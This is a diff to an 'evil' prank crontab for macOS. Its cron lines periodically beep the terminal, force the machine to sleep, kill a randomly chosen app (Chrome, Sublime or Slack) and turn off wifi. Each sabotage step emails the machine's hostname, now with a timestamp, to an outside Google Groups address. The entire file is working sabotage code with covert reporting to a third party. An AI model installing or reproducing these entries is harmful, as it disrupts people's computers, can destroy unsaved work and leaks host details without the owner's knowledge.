@@ -27,13 +27,13 @@
 */10 * * * * tput bel
 
 # Go to sleep once every hour
-0 * * * * pmset sleepnow > /dev/null 2>&1 && (echo "Screen went to sleep on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
+0 * * * * pmset sleepnow > /dev/null 2>&1 && (echo "`date`: Screen went to sleep on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
 
 # Kill a app once every three hours
-0 */3 * * * apps=('Chrome' 'Sublime' 'Slack') && app=${apps[$RANDOM % ${#apps[@]} ]} && kill -9 $(pgrep $app) && (echo "An app died on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
+0 */3 * * * apps=('Chrome' 'Sublime' 'Slack') && app=${apps[$RANDOM % ${#apps[@]} ]} && kill -9 $(pgrep $app) && (echo "`date`: An app died on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
 
 # Switch off wifi once every three hours
-30 */3 * * * networksetup -setairportpower en0 off && (echo "Wifi turned off on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
+30 */3 * * * networksetup -setairportpower en0 off && (echo "`date`: Wifi turned off on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
 
 ################################################################################
 
